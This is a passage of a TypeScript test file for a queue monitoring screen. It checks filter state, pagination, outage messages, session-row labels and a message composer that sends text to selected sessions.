      assert.equal(triggers.Session?.value, row.session);
      assert.equal(bar?.props.isApplied, row.isApplied);
    });
  }

  test("Reset filters returns both axes to All", () => {
    const { bar, picks } = renderBar({ profile: "personal", session: SESSION_ID });
    (bar?.props.onReset as () => void)();
    assert.deepEqual(getPlain(picks), [{ profile: "", session: "" }]);
  });

  test("a chosen value no loaded item carries stays an option, so its trigger still names it", () => {
    const { triggers } = renderBar({ profile: "archived", session: "" });
    assert.equal(triggers.Account?.value, "archived");
    assert.ok((triggers.Account?.options as Array<{ key: string }>).some((option) => option.key === "archived"));
  });
});

describe("filter state in the hash", () => {
  const load = async (hash: string) => {
    const location = { hash };
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub(), location, history: { replaceState: (_state: unknown, _title: string, url: string) => { location.hash = url; } } },
    })) as ScreenModule;
    return { module, location };
  };
  const rows = [
    { name: "both axes round-trip through the screen query", start: "#queue", filter: { profile: "work-dev", session: SESSION_ID } },
    { name: "one axis round-trips and the other stays All", start: "#queue?profile=old", filter: { profile: "", session: SESSION_ID } },
    { name: "defaults leave a bare screen hash and read back as defaults", start: "#queue?profile=personal", filter: { profile: "", session: "" } },
  ];
  for (const row of rows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setFilterHashQ as (filter: unknown) => void)(row.filter);
      assert.ok(location.hash.startsWith("#queue"), location.hash);
      assert.deepEqual(getPlain((module.getFilterFromHashQ as () => unknown)()), row.filter);
    });
  }
});

describe("Show more", () => {
  test("Show more is the quiet small load-more button every screen uses", () => {
    const [button] = buttonLabelled(render("ShowMoreQ", { count: 100, isBusy: false, onMore: () => undefined }), "Show more");
    assert.equal(button?.props.className, "btn ghost sm");
  });

  test("the next page after the cursor joins the loaded list in queue order", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ items: [buildItem({ id: 3 })], nextCursor: null, isSocketDeliveryOn: true }) };
      },
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "ready", data: { items: [buildItem({ id: 1 }), buildItem({ id: 2 })], nextCursor: 12, isSocketDeliveryOn: true } };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getMoreQ as (deps: unknown) => Promise<void>)({ list, setList });
    const data = getPlain(list.data) as { items: Array<{ id: number }>; nextCursor: number | null };
    assert.match(urls[0] ?? "", /[?&]after=12(&|$)/);
    assert.deepEqual(data.items.map((item) => item.id), [1, 2, 3]);
    assert.equal(data.nextCursor, null);
  });
});

describe("list read", () => {
  const read = async (status: number, body: unknown) => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status, json: async () => body }),
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "idle", data: null, error: null };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getListQ as (deps: unknown) => Promise<void>)({ setList });
    return list;
  };

  test("an answer carrying the item list is ready", async () => {
    assert.equal((await read(200, { items: [], nextCursor: null, isSocketDeliveryOn: true })).status, "ready");
  });

  test("a 2xx answer without an item list is a read failure, never a list to render", async () => {
    const list = await read(200, { rows: [] });
    assert.equal(list.status, "error");
    assert.equal(list.data, null);
  });

  // no sign-in state to hand a refusal to → every refused read is a failure with Retry
  const refusals = [
    { name: "a 503 database outage is a read failure with Retry", status: 503, body: { error: "database_unavailable" }, expected: "error" },
    { name: "a 503 with any other code is a read failure with Retry", status: 503, body: { error: "not_provisioned" }, expected: "error" },
    { name: "a 401 is a read failure with Retry", status: 401, body: { error: "unauthorized" }, expected: "error" },
  ];
  for (const row of refusals) test(row.name, async () => assert.equal((await read(row.status, row.body)).status, row.expected));
});

describe("one outage reads one way across the page", () => {
  const outages = [
    { name: "no answer at all", answer: { status: 0, data: null, error: new TypeError("Failed to fetch") } },
    { name: "a database outage", answer: { status: 503, data: { error: "database_unavailable" } } },
    { name: "an unknown server error", answer: { status: 500, data: { error: "queue_environment_failure" } } },
  ];
  const others = [
    { name: "an unknown refusal", answer: { status: 415, data: null } },
    { name: "a 2xx answer without the expected list", answer: { status: 200, data: { rows: [] } } },
  ];
  type Answer = { status: number; data: unknown; error?: Error };
  const fetchFor = (answer: Answer) => async () => {
    if (answer.status === 0) throw answer.error;
    return { status: answer.status, json: async () => answer.data };
  };
  const getCard = (answer: Answer) => {
    const failure = call<{ sentence: string; next: string; detail: string }>("getReadFailureQ", answer);
    const [card] = findNodes(render("QueueFailureQ", { failure, onRetry: () => undefined }), (node) => node.props?.atom === "AlertCard");
    return { failure, card };
  };
  const getRegionText = async (answer: Answer) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: realUi }, fetch: fetchFor(answer) })) as ScreenModule;
    let region = realUi.INITIAL_REGION_STATE as { error: unknown };
    const setResumes = (next: (prev: unknown) => typeof region) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    const element = realUiReact.createElement(realUi.RegionUnavailable, { source: "recent automatic resumes", error: region.error });
    return collectText(renderScreen(element) as RenderedNode);
  };

  for (const row of [...outages, ...others]) {
    test(`the list card gives the resume region's next step, the raw answer behind Details: ${row.name}`, async () => {
      const { failure, card } = getCard(row.answer);
      const regionText = await getRegionText(row.answer);
      assert.ok(regionText.includes(String(card?.props.body)), `card "${card?.props.body}" | region "${regionText}"`);
      assert.doesNotMatch(`${card?.props.title} ${card?.props.body}`, /HTTP|\d{3}|_/);
      assert.equal(card?.props.details, failure.detail);
    });
  }

  for (const row of outages) {
    test(`an owner action on the same outage gives the card's next step: ${row.name}`, () => {
      const { failure } = getCard(row.answer);
      assert.equal(call("getActionErrorQ", row.answer), failure.next);
    });
  }

  // action lines carry no Details → an unanswered request in any browser wording reads as the server not answering
  test("an owner action on an unanswered request in unrecognised browser wording names the server, never Details", () => {
    const answer = { status: 0, data: null, error: new TypeError("The network connection was lost.") };
    const { next } = getCard(outages[0].answer).failure;
    const line = call<string>("getActionErrorQ", answer);
    assert.equal(line, next);
    assert.doesNotMatch(line, /Details/);
  });

  test("a database outage names the database on the card and in the region", async () => {
    const answer = { status: 503, data: { error: "database_unavailable" } };
    assert.match(String(getCard(answer).card?.props.body), /database/);
    assert.match(await getRegionText(answer), /database/);
  });

});

describe("page header freshness", () => {
  const readAt = () => new Date().toISOString();
  const list = (overrides: Record<string, unknown> = {}) => ({ status: "ready", data: { items: [] }, error: null, readAt: readAt(), ...overrides });
  const resumes = (overrides: Record<string, unknown> = {}) => ({ ...READY_RESUMES, ...overrides });
  const getHeader = (queue: Record<string, unknown>) => {
    const [header] = findNodes(render("QueueHeaderQ", { queue: { reload: () => undefined, sessions: buildSessions(), ...queue } }), (node) => node.props?.atom === "PageHeader");
    const freshness = header?.props.freshness as { props: Record<string, unknown> };
    const refresh = header?.props.refresh as { props: Record<string, unknown> };
    const stamp = collectText(renderScreen(realUiReact.createElement(realUi.FreshnessStamp, freshness.props)) as RenderedNode);
    return { stamp, isBusy: refresh.props.isBusy };
  };

  const rows = [
    { name: "a failed resume re-read after a good read reads Partial", queue: { list: list(), resumes: resumes({ data: [], error: "HTTP 503 database_unavailable" }) }, stamp: /Partial/, isBusy: false },
    { name: "a failed list read beside a good resume read reads Partial", queue: { list: list({ status: "error", error: { detail: "HTTP 500" } }), resumes: resumes() }, stamp: /Partial/, isBusy: false },
    { name: "a resume read in flight keeps Refresh busy", queue: { list: list(), resumes: resumes({ busy: true }) }, stamp: /^$/, isBusy: true },
    { name: "both reads landed shows no stamp", queue: { list: list(), resumes: resumes() }, stamp: /^$/, isBusy: false },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { stamp, isBusy } = getHeader(row.queue);
      assert.match(stamp.trim(), row.stamp);
      assert.equal(isBusy, row.isBusy);
    });
  }
});

const ENDED_ID = "3d8a5f20-7c41-4b9e-8e2d-5a1c6b0f9e37";
const REPLACED_ID = "c41e9b07-2f6d-4a83-9b15-7e0d3c8a2f64";

function buildSessionRow(overrides: Record<string, unknown> = {}) {
  const id = String(overrides.id ?? SESSION_ID);
  return {
    id,
    sessionIdPrefix: id.slice(0, 8),
    name: "nightly-docs-sweep",
    isNameRegistered: true,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    state: "live",
    exitReason: null,
    lastActivityAt: "2026-11-12T03:41:09.336Z",
    count: { awaiting: 1, inDelivery: 0 },
    markerSetAt: null,
    isSelectable: true,
    ...overrides,
  };
}

const SESSION_ROWS = [
  buildSessionRow(),
  buildSessionRow({ id: ENDED_ID, name: "atrium-hooks", isNameRegistered: false, state: "exited", exitReason: "ended" }),
  buildSessionRow({ id: REPLACED_ID, state: "exited", exitReason: "replaced", isSelectable: false }),
];

function buildSessions(overrides: Record<string, unknown> = {}) {
  return {
    region: { status: "ready", data: { sessions: SESSION_ROWS, hasMore: false }, error: null, busy: false },
    read: () => undefined,
    selectedIds: [],
    toggle: () => undefined,
    clear: () => undefined,
    isEndedShown: false,
    setEndedShown: () => undefined,
    composer: { text: "", isBusy: false, error: null, sentCount: null },
    setText: () => undefined,
    send: () => undefined,
    ...overrides,
  };
}

// the table's rows as the shipped Table renders them: its body callback, called with a wide view
function renderSessionRows(rows: unknown[], onToggle: (id: string) => void = () => undefined): RenderedNode {
  const [table] = findNodes(render("SessionsTableQ", { rows, selectedIds: [], onToggle }), (node) => node.props.atom === "Table");
  const [body] = table?.props.bodies as Array<{ rows: (view: unknown) => unknown[] }>;
  const view = { isStacked: false, columnCount: 8 };
  return renderScreen(screen.React.createElement("tbody", null, ...(body?.rows(view) ?? []))) as RenderedNode;
}

describe("sessions region rows", () => {
  const rowText = (row: unknown) => collectText(renderSessionRows([row]));

  test("a row shows the registered name, and a nameless row shows its start-directory name marked as such", () => {
    const named = rowText(buildSessionRow());
    const nameless = rowText(buildSessionRow({ name: "glass-atrium", isNameRegistered: false }));
    assert.ok(named.includes("nightly-docs-sweep") && !named.includes("start directory"), named);
    assert.ok(nameless.includes("glass-atrium") && nameless.includes("start directory"), nameless);
  });

  const states = [
    { name: "a live session", row: { state: "live" }, label: "Live" },
    { name: "a session that stopped answering probes", row: { state: "stale" }, label: "Not reachable" },
    { name: "a session that ended", row: { state: "exited", exitReason: "ended" }, label: "Ended" },
    { name: "a session whose process is gone", row: { state: "exited", exitReason: "dead" }, label: "Ended · process gone" },
    { name: "a session another took over", row: { state: "exited", exitReason: "replaced" }, label: "Replaced" },
  ];
  for (const row of states) test(`state label: ${row.name}`, () => assert.equal(call("getSessionStateLabelQ", buildSessionRow(row.row)), row.label));

  test("a replaced row's checkbox is disabled and every other row's is not", () => {
    const tree = renderSessionRows(SESSION_ROWS);
    const boxes = findNodes(tree, (node) => node.type === "input" && node.props.type === "checkbox");
    assert.deepEqual(boxes.map((box) => box.props.disabled === true), [false, false, true]);
  });

  test("ticking a row calls the toggle with that row's id", () => {
    const toggled: unknown[] = [];
    const tree = renderSessionRows(SESSION_ROWS, (id) => toggled.push(id));
    const [, endedBox] = findNodes(tree, (node) => node.type === "input" && node.props.type === "checkbox");
    (endedBox?.props.onChange as () => void)();
    assert.deepEqual(toggled, [ENDED_ID]);
  });

  test("ticking adds a row and ticking it again removes it, keeping the other ticks", () => {
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID], ENDED_ID), [SESSION_ID, ENDED_ID]);
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID, ENDED_ID], SESSION_ID), [ENDED_ID]);
  });

  test("ended rows stay hidden until Show ended is on", () => {
    const ids = (isEndedShown: boolean) => call<Array<{ id: string }>>("getShownSessionsQ", SESSION_ROWS, isEndedShown).map((row) => row.id);
    assert.deepEqual(ids(false), [SESSION_ID]);
    assert.deepEqual(ids(true), [SESSION_ID, ENDED_ID, REPLACED_ID]);
  });
});

describe("message composer", () => {
  const shown = SESSION_ROWS;
  test("the targets are the ticked rows on show, never a hidden ended row or a replaced row", () => {
    const ticked = [SESSION_ID, ENDED_ID, REPLACED_ID];
    assert.deepEqual(call("getSendTargetsQ", shown, ticked), { ids: [SESSION_ID, ENDED_ID], endedCount: 1 });
    assert.deepEqual(call("getSendTargetsQ", [shown[0]], ticked), { ids: [SESSION_ID], endedCount: 0 });
  });

  const labels = [
    { name: "one live target", targets: { ids: [SESSION_ID], endedCount: 0 }, label: "Send to 1 session" },
    { name: "two live targets", targets: { ids: [SESSION_ID, ENDED_ID], endedCount: 0 }, label: "Send to 2 sessions" },
    { name: "an ended target among them", targets: { ids: [SESSION_ID, ENDED_ID], endedCount: 1 }, label: "Send to 2 sessions · resumes 1 ended" },
  ];
  for (const row of labels) test(`the Send label names the target and ended counts: ${row.name}`, () => assert.equal(call("getSendLabelQ", row.targets), row.label));

  const MAX_TARGETS = vm.runInContext("MESSAGE_Q.MAX_TARGETS", screen) as number;
  const bodies = [
    { name: "no ticked row", ids: [], text: "rebase on main", isSendable: false },
    { name: "blank text", ids: [SESSION_ID], text: "", isSendable: false },
    { name: "whitespace-only text", ids: [SESSION_ID], text: " \n\t ", isSendable: false },
    { name: "more targets than one send takes", ids: Array.from({ length: MAX_TARGETS + 1 }, () => randomUUID()), text: "rebase on main", isSendable: false },
    { name: "ticked rows and text", ids: [SESSION_ID, ENDED_ID], text: "rebase on main", isSendable: true },
  ];
  for (const row of bodies) {
    test(`Send is enabled only for ticked rows and non-blank text: ${row.name}`, () => {
      const sent: unknown[] = [];
      const tree = render("MessageComposerQ", {
        targets: { ids: row.ids, endedCount: 0 },
        composer: { text: row.text, isBusy: false, error: null, sentCount: null },
        onText: () => undefined,
        onSend: (body: unknown) => sent.push(body),
        onClear: () => undefined,
      });
      const [send] = findNodes(tree, (node) => node.type === "button" && collectText(node).startsWith("Send to"));
      assert.equal(send?.props.disabled, !row.isSendable);
      if (row.isSendable) (send?.props.onClick as () => void)();
      assert.deepEqual(getPlain(sent), row.isSendable ? [{ sessionIds: row.ids, text: row.text }] : []);
    });
  }

  test("the page's per-send target cap is the send route's: the cap passes and one more is refused", () => {
    const text = "rebase on main";
    const ids = (count: number) => Array.from({ length: count }, () => randomUUID());
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS), text }).success, true);
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS + 1), text }).success, false);
  });
});

describe("a message send's answer", () => {
  const run = async (status: number, answer: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => answer };
      },
    })) as ScreenModule;
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null, sentCount: null };
    let selectedIds: string[] = [SESSION_ID, ENDED_ID];
    const counts = { sent: 0 };
    const isDone = await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" },
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); },
      setSelectedIds: (next: string[]) => { selectedIds = next; },
      onSent: () => { counts.sent += 1; },
    });
    return { isDone, posts: getPlain(posts), composer: getPlain(composer), selectedIds: getPlain(selectedIds), sent: counts.sent };
  };

  test("a taken send posts every ticked id with the text, then clears the text and the ticks and re-reads the page", async () => {
    const result = await run(201, { items: [{ id: 81, sessionId: SESSION_ID }, { id: 82, sessionId: ENDED_ID }] });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/messages/send", body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" } }]);
    assert.equal(result.isDone, true);
    assert.deepEqual(result.composer, { text: "", isBusy: false, error: null, sentCount: 2 });
    assert.deepEqual(result.selectedIds, []);
    assert.equal(result.sent, 1);
  });

  const refusals = [
    { name: "a replaced target names the server's reason", status: 409, answer: { error: "session_replaced", reason: "a replaced session takes no message" }, error: "Refused: a replaced session takes no message." },
    { name: "an unknown target names the server's reason", status: 404, answer: { error: "unknown_session", reason: "every target must be a registered session" }, error: "Refused: every target must be a registered session." },
    { name: "a refusal with no reason shows fixed copy", status: 403, answer: { error: "forbidden" }, error: "The monitor refused this message. Refresh the session list and try again." },
  ];
  for (const row of refusals) {
    test(`a refused send keeps the text and the ticks: ${row.name}`, async () => {
      const result = await run(row.status, row.answer);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.composer, { text: "rebase on main", isBusy: false, error: row.error, sentCount: null });
      assert.deepEqual(result.selectedIds, [SESSION_ID, ENDED_ID]);
      assert.equal(result.sent, 0);
    });
  }

  test("a send during an outage gives the page's outage step", async () => {
    const result = await run(503, { error: "database_unavailable" });
    assert.equal(result.composer.error, call("getActionErrorQ", { status: 503, data: { error: "database_unavailable" } }));
  });
});

describe("sessions region", () => {
  test("the list read follows the Account filter and drops ticks on rows no longer listed or selectable", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ sessions: SESSION_ROWS, hasMore: false }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    let selectedIds = ["9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", SESSION_ID, REPLACED_ID];
    await (module.getSessionsQ as (deps: unknown) => Promise<void>)({
      profile: "work dev",
      setRegion: (next: (prev: unknown) => unknown) => { region = next(region); },
      setSelectedIds: (next: (prev: string[]) => string[]) => { selectedIds = next(selectedIds); },
    });
    assert.deepEqual(urls, ["/api/queue/owner/sessions?profile=work+dev"]);
    assert.equal((getPlain(region) as { data: { sessions: unknown[] } }).data.sessions.length, 3);
    assert.deepEqual(getPlain(selectedIds), [SESSION_ID]);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable" },
    { name: "no session at all shows the empty state", region: { status: "ready", data: { sessions: [], hasMore: false }, error: null, busy: false }, atom: "EmptyState" },
    { name: "a loaded list shows the table", region: buildSessions().region, atom: "Table" },
  ];
  for (const view of views) {
    test(view.name, () => {
      const tree = render("SessionsRegionQ", { sessions: buildSessions({ region: view.region }), onSent: () => undefined });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom).length, 1);
    });
  }

  const composerRows = [
    { name: "no tick shows no composer", selectedIds: [], fields: 0 },
    { name: "a tick shows the composer", selectedIds: [SESSION_ID], fields: 1 },
  ];
  for (const row of composerRows) {
    test(row.name, () => {
      const tree = render("SessionsRegionQ", { sessions: buildSessions({ selectedIds: row.selectedIds }), onSent: () => undefined });
      assert.equal(findNodes(tree, (node) => node.type === "MessageComposerQ").length, row.fields);
    });
  }

  test("a taken send says how many sessions it went to once the composer is gone", () => {
    const tree = render("SessionsRegionQ", { sessions: buildSessions({ composer: { text: "", isBusy: false, error: null, sentCount: 2 } }), onSent: () => undefined });
    const [notice] = findNodes(tree, (node) => node.props?.role === "status");
    assert.match(collectText(notice as RenderedNode), /Sent to 2 sessions/);
  });

  test("the region sits after the item cards and before the recent resumes", () => {
    const { queue } = buildQueue();
    const data = { items: [buildItem({ id: 1 })], nextCursor: null, isSocketDeliveryOn: true };
    const tree = render("QueueListQ", { queue: { ...queue, list: { status: "ready", data }, filter: { profile: "", session: "" }, setFilter: () => undefined } });
    const order = findNodes(tree, (node) => ["QueueCardQ", "SessionsRegionQ", "RecentResumesQ"].includes(node.type)).map((node) => node.type);
    assert.deepEqual(order, ["QueueCardQ", "SessionsRegionQ", "RecentResumesQ"]);
  });
});

test("a message card says when it was sent, not asked", () => {
  const text = collectText(render("CardMetaQ", { item: buildItem({ kind: "message" }) }));
  assert.match(text, /· sent /);
  assert.doesNotMatch(text, /asked/);
});
